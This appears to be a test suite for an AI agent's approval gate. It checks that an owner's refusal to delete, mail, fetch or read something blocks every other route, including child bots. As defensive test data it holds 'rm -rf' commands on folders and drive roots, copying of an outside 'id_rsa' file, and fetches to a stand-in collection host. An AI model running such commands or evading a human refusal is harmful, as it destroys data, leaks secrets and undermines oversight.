/**
 * S2-07: a "no" covers the thing, not just the tool, for the rest of the run. If the owner
 * refuses a delete, the bot cannot reach the same file by overwriting it, appending to it,
 * moving it, copying it or going through the shell, and the same goes for an address.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdirSync, writeFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { ApprovalBroker, type Decision } from "../src/agent/approval-broker";
import { gateToolCall, type GateResult } from "../src/agent/tool-gate";
import { SHELL_REFUSAL, findDenial, recordDenial } from "../src/policy/denials";
import { pathsOverlap } from "../src/policy/resources";
import { decide } from "../src/policy/engine";
import { MCP_FREE_TOOLS } from "../src/plugins/mcp";
import { addApprovalRule, approvalTarget } from "../src/stores/approval-rules";
import type { RunContext } from "../src/policy/types";
import { policyRig, type PolicyRig } from "./policy-fixture";

let rig: PolicyRig;
let answers: Array<Decision | "expire">;
let cards: number;
let shown: Array<{ preview?: string }>;
beforeEach(() => { rig = policyRig(); answers = []; cards = 0; shown = []; });
afterEach(() => rig.close());

/** Ask for a call as a turn would: the owner's answers come from `answers`, in order. */
async function ask(run: RunContext, tool: string, args: Record<string, unknown>): Promise<GateResult> {
  const broker = new ApprovalBroker({
    db: rig.db, emit: (frame) => { cards += 1; shown.push(frame as { preview?: string }); },
    waitForDecision: async (requestID, signal) => {
      const next = answers.shift();
      if (next === "expire" || next === undefined) {
        // Nobody answers: the wait ends when its time is up.
        await new Promise<void>((resolve) => { if (signal.aborted) resolve(); else signal.addEventListener("abort", () => resolve(), { once: true }); });
        return null;
      }
      rig.db.run("UPDATE approvals SET status='decided', decision=?, decided_at=? WHERE id=?", [next, new Date().toISOString(), requestID]);
      return next;
    },
  });
  return gateToolCall(
    { db: rig.db, broker, emit: () => undefined, setState: () => undefined, hold: () => () => undefined, ownerWaitMs: 50 },
    run, { tool, args, callID: `call_${Math.random().toString(36).slice(2)}` }, new AbortController().signal,
  );
}

const refused = (result: GateResult): boolean => !result.go && result.code === "denied_resource";

describe("a denied delete covers the file by every other route", () => {
  beforeEach(() => writeFileSync(join(rig.scratch, "report.txt"), "the report"));

  test("the owner says no to the delete: it does not run", async () => {
    answers.push("reject");
    const result = await ask(rig.run, "bash", { command: "rm report.txt" });
    expect(result.go).toBe(false);
    if (!result.go) expect(result.code).toBe("approval_rejected");
    expect(cards).toBe(1);
  });

  test("then overwrite, append, move, copy and shell are refused, with no card and not run", async () => {
    const tries: Array<[string, Record<string, unknown>]> = [
      ["write_file", { path: "report.txt", content: "new" }],
      ["write_file", { path: "report.txt", content: "more", append: true }],
      ["write_file", { path: join(rig.scratch, "REPORT.TXT"), content: "again" }],
      ["bash", { command: "mv report.txt elsewhere.txt" }],
      ["bash", { command: "cp report.txt copy.txt" }],
      ["bash", { command: "rm -f ./report.txt" }],
      ["bash", { command: "rm -rf ." }],
    ];
    let route = 0;
    for (const [tool, args] of tries) {
      // Each route gets its own run (three tries at one thing in one run end that run, which is its own test below).
      route += 1;
      const run = rig.another({ turnID: `trn_route_${route}`, rootTurnID: `trn_route_${route}` });
      answers.push("reject");
      await ask(run, "bash", { command: "rm report.txt" });
      const result = await ask(run, tool, args);
      expect({ tool, args, refused: refused(result) }).toEqual({ tool, args, refused: true });
    }
    // The only cards were the asks about the delete: every other route was answered before it asked.
    expect(cards).toBe(tries.length);
  });

  test("a command the server cannot follow to file names asks, naming the refusal, and does not run", async () => {
    // A redirect and a pattern are not read for file names: the owner is asked, each time, with the refusal on the card.
    for (const command of ["echo gone > report.txt", "rm *.txt", "rm $F", "sudo -u x rm report.txt"]) {
      const run = rig.another({ turnID: `trn_open_${command.length}`, rootTurnID: `trn_open_${command.length}` });
      answers.push("reject");
      await ask(run, "bash", { command: "rm report.txt" });
      const before = cards;
      const result = await ask(run, "bash", { command });
      expect({ command, ran: result.go, asked: cards - before }).toEqual({ command, ran: false, asked: 1 });
      expect(shown.at(-1)?.preview, command).toContain("You said no to deleting");
      expect(shown.at(-1)?.preview, command).toContain("may touch it");
    }
  });

  test("the refusal tells the model it covers every route and what to do instead", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const result = await ask(rig.run, "write_file", { path: "report.txt", content: "x" });
    expect(result.go).toBe(false);
    if (!result.go) {
      const { error } = JSON.parse(result.content) as { error: string };
      expect(error).toContain("the owner said no to deleting");
      expect(error).toContain("report.txt");
      expect(error).toContain("every tool and every route");
      expect(error).toContain("Tell the owner what you were trying to do");
    }
  });

  test("the owner sees one quiet line saying what was blocked and why, not a card", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const result = await ask(rig.run, "write_file", { path: "report.txt", content: "x" });
    expect(!result.go && result.preview).toMatch(/^Blocked: .+ tried to overwrite a file after you said no to deleting it\.$/);
  });

  test("reading the file is still allowed: a no to deleting is not a no to reading", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    expect((await ask(rig.run, "read_file", { path: "report.txt" })).go).toBe(true);
    expect((await ask(rig.run, "bash", { command: "cat report.txt" })).go).toBe(true);
  });

  test("another file is not covered", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    answers.push("once");
    const result = await ask(rig.run, "write_file", { path: "notes.md", content: "x" });
    expect(result.go).toBe(true);
  });

  test("a card nobody answered is a no as well", async () => {
    answers.push("expire");
    const first = await ask(rig.run, "bash", { command: "rm report.txt" });
    expect(!first.go && first.code).toBe("approval_expired");
    expect(refused(await ask(rig.run, "write_file", { path: "report.txt", content: "x" }))).toBe(true);
  });

  test("the next run starts clean: the no lasts for the run, not for ever", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const later = rig.another({ turnID: "trn_next" });
    answers.push("once");
    expect((await ask(later, "write_file", { path: "report.txt", content: "x" })).go).toBe(true);
  });

  test("a bot the run hands work to is covered too, because it shares the run", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const child = rig.another({ turnID: "trn_child", rootTurnID: rig.run.rootTurnID, bot: "researcher" });
    expect(refused(await ask(child, "write_file", { path: "report.txt", content: "x" }))).toBe(true);
  });
});

describe("a denied address covers it across tools", () => {
  test("no to a mail covers a calendar invite to the same person, and not another person", async () => {
    answers.push("reject");
    await ask(rig.run, "mail_send", { account: "owner", to: ["ann@example.com"], subject: "s", body: "b" });
    expect(refused(await ask(rig.run, "calendar_create", { account: "agent", summary: "x", start: "2026-11-20T09:00:00Z", end: "2026-11-20T10:00:00Z", attendees: ["Ann@Example.com"] }))).toBe(true);
    expect(refused(await ask(rig.run, "mail_send", { account: "agent", to: ["ann@example.com"], subject: "s", body: "b" }))).toBe(true);
    expect(refused(await ask(rig.run, "mail_send", { account: "agent", to: ["bob@example.com"], subject: "s", body: "b" }))).toBe(false);
  });

  test("no to opening a site covers fetching it another way", async () => {
    const tainted = rig.another({ taint: [{ kind: "web", label: "x", at: "2026-11-16T10:00:00Z" }] });
    answers.push("reject");
    await ask(tainted, "web_fetch", { url: "https://collect.evil.example/a?d=1" });
    expect(refused(await ask(tainted, "web_fetch", { url: "https://collect.evil.example/b" }))).toBe(true);
    expect(refused(await ask(tainted, "link_save", { url: "https://collect.evil.example/c" }))).toBe(true);
  });
});

describe("a bot that keeps trying is stopped", () => {
  test("the third try at something the owner refused ends the run", async () => {
    writeFileSync(join(rig.scratch, "report.txt"), "the report");
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const tries = [];
    for (let i = 0; i < 3; i += 1) tries.push(await ask(rig.run, "write_file", { path: "report.txt", content: `try ${i}` }));
    expect(tries.map((result) => (result.go ? "go" : result.stop ? "stop" : result.code))).toEqual(["denied_resource", "denied_resource", "stop"]);
    const last = tries[2]!;
    if (!last.go) expect(last.stop?.cause).toBe("refused");
  });
});

describe("the record itself", () => {
  test("a denial is found by the run's root and the resource, for the operations that hurt", () => {
    recordDenial(rig.db, rig.run, { tool: "bash", operation: "delete", cause: "denied", resources: [{ kind: "path", value: "/x/a.txt" }] });
    expect(findDenial(rig.db, rig.run, "change", [{ kind: "path", value: "/x/a.txt" }])?.operation).toBe("delete");
    expect(findDenial(rig.db, rig.run, "read", [{ kind: "path", value: "/x/a.txt" }])).toBeNull();
    expect(findDenial(rig.db, rig.run, "change", [{ kind: "path", value: "/x/other.txt" }])).toBeNull();
    // A command on the folder reaches the file inside it.
    expect(findDenial(rig.db, rig.run, "delete", [{ kind: "path", value: "/x" }])).not.toBeNull();
    expect(findDenial(rig.db, rig.another({ turnID: "other", rootTurnID: "other" }), "change", [{ kind: "path", value: "/x/a.txt" }])).toBeNull();
  });
});

describe("a denied read covers every route that reads the file", () => {
  /** A file outside scratch, so reading it asks. Spelled for Git Bash (`/c/...` on Windows). */
  function outsideWord(): string {
    const folder = join(rig.scratch, "..", "outside");
    mkdirSync(folder, { recursive: true });
    const real = resolve(folder, "id_rsa");
    writeFileSync(real, "secret");
    return process.platform === "win32" ? real.replace(/^([A-Za-z]):/, (_, drive: string) => `/${drive.toLowerCase()}`).replaceAll("\\", "/") : real;
  }

  let routes = 0;
  test("cp and mv read their source: after a no to `cat`, both are refused with no card", async () => {
    const word = outsideWord();
    for (const command of [`cp ${word} notes.txt`, `mv ${word} notes.txt`, `cp -r ${word} notes.txt`]) {
      const id = `trn_read_${++routes}`;
      const run = rig.another({ turnID: id, rootTurnID: id });
      answers.push("reject");
      await ask(run, "bash", { command: `cat ${word}` });
      const before = cards;
      const result = await ask(run, "bash", { command });
      expect({ command, refused: refused(result), asked: cards - before }).toEqual({ command, refused: true, asked: 0 });
    }
  });

  test("a no to deleting is still not a no to reading", async () => {
    const word = outsideWord();
    answers.push("reject");
    await ask(rig.run, "bash", { command: `rm ${word}` });
    expect(refused(await ask(rig.run, "bash", { command: `cat ${word}` }))).toBe(false);
  });
});

describe("a run that holds a refusal does not give a connector tool a free pass", () => {
  const TOOL = "mcp_notion_search";
  const shellRefusal = { tool: "bash", operation: "run" as const, cause: "denied" as const, resources: [SHELL_REFUSAL] };
  const fileRefusal = { tool: "bash", operation: "delete" as const, cause: "denied" as const, resources: [{ kind: "path" as const, value: "/x/report.txt" }] };

  /** A connector tool the owner trusted (it runs without a card in a clean run). */
  function trustedConnector(): RunContext {
    rig.registry.register({ name: TOOL, description: "x", kind: "static", schema: { type: "object", properties: {} }, timeoutMs: 1000, handler: async () => ({}) });
    MCP_FREE_TOOLS.add(TOOL);
    return rig.another({ capabilities: [TOOL] });
  }
  afterEach(() => MCP_FREE_TOOLS.delete(TOOL));
  const decideTool = (run: RunContext) => decide(run, { tool: TOOL, args: {}, callID: "call_mcp" });

  test("baseline: a trusted connector tool runs free when the run holds no refusal", () => {
    expect(decideTool(trustedConnector()).action).toBe("run");
  });

  test("after a refused shell command it asks, names the refusal, and cannot be remembered", () => {
    const run = trustedConnector();
    recordDenial(rig.db, run, shellRefusal);
    const decision = decideTool(run);
    expect(decision.action).toBe("ask");
    if (decision.action !== "ask") return;
    expect(decision.card.refusedRun).toContain("You said no to running a command");
    expect(decision.card.canRemember).toBe(false);
  });

  test("after a refused file, it asks and the card names the file", () => {
    const run = trustedConnector();
    recordDenial(rig.db, run, fileRefusal);
    const decision = decideTool(run);
    expect(decision.action).toBe("ask");
    if (decision.action !== "ask") return;
    expect(decision.card.refusedRun).toContain("You said no to deleting");
    expect(decision.card.refusedRun).toContain("report.txt");
    expect(decision.card.canRemember).toBe(false);
  });

  test("a stored rule does not approve it while the run holds a refusal", () => {
    const run = trustedConnector();
    MCP_FREE_TOOLS.delete(TOOL);
    const target = approvalTarget(TOOL, {})!;
    addApprovalRule(rig.db, { agentID: run.bot, toolName: TOOL, target });
    expect(decideTool(run).action, "baseline: the stored rule approves it in a clean run").toBe("run");
    recordDenial(rig.db, run, fileRefusal);
    expect(decideTool(run).action).toBe("ask");
  });
});

describe("a refusal and a drive or filesystem root", () => {
  // A root key already ends in a separator: `c:\` and `/` are folders, and every path under them is inside.
  test.each<[string, string]>([
    ["c:\\users\\x\\report.txt", "c:\\"],
    ["c:\\", "c:\\users\\x"],
    ["/home/x/report.txt", "/"],
    ["/", "/home/x"],
    ["/c/users/x", "/c/"],
  ])("%s and %s overlap", (a, b) => {
    expect(pathsOverlap(a, b)).toBe(true);
    expect(pathsOverlap(b, a)).toBe(true);
  });

  test.each<[string, string]>([
    ["c:\\users", "c:\\usersx"],
    ["c:\\", "d:\\"],
    ["/a/b", "/a/bc"],
  ])("%s and %s do not overlap", (a, b) => {
    expect(pathsOverlap(a, b)).toBe(false);
  });

  const onWindows = process.platform === "win32";

  test.skipIf(!onWindows)("after a no to deleting a file, `rm -rf /c/` (the whole drive) is refused outright", async () => {
    writeFileSync(join(rig.scratch, "report.txt"), "the report");
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const before = cards;
    const result = await ask(rig.run, "bash", { command: "rm -rf /c/" });
    expect({ refused: refused(result), asked: cards - before }).toEqual({ refused: true, asked: 0 });
  });

  test.skipIf(!onWindows)("a no to deleting the drive root covers a Git Bash path under it", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm -rf C:/" });
    const before = cards;
    const result = await ask(rig.run, "bash", { command: "rm /c/Users/someone/notes.txt" });
    expect({ refused: refused(result), asked: cards - before }).toEqual({ refused: true, asked: 0 });
  });
});
